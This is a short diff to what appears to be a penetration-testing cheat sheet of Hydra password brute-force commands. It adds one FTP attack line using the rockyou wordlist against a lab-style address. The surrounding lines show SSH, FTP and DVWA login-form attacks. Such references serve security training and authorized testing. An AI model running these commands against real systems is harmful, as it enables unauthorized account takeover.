@@ -4,6 +4,8 @@
 
 ```hydra -l admin -P password-file.txt -v x.x.x.x ftp```
 
+```hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp```
+
 ```hydra -l root -P password-file.txt x.x.x.x ssh```
 
 ```hydra -l admin -P /usr/share/dirb/wordlists/small.txt 192.168.1.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -V```
